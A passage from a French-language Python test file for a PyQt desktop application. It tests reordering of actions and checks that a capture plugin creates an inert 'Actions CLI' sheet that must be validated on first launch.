    sur["Descendre"](False)                                                                 # PyQt passe `checked` : doit être ignoré
    assert [a["nom"] for a in v.actions] == ["B", "A"]


def test_premier_lancement_cree_la_fiche_des_actions_inerte(app, tmp_path, monkeypatch):
    monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path / "xdg"))
    s = Store(Paths(tmp_path / "am"))
    s.sauver_reglages(recovery_asked=True)
    shutil.copytree(RACINE, s.paths.base / "plugins" / "capture")
    w = Fenetre(s)
    w.plugins.decouvrir()
    assert w.plugins.activer("capture"), w.plugins.infos["capture"].erreur
    th = s.theme("Outils")
    assert th is not None and len(th.fiches) == 1 and th.fiches[0].titre == "Actions CLI"
    assert not s.fiche_validee(th, th.fiches[0])                                            # créée inerte : à valider
    assert [a["nom"] for a in lg.depuis_texte(th.fiches[0].texte)] == [e["nom"] for e in lg.EXEMPLES]
    w.quitter_vraiment = True
    w.close()
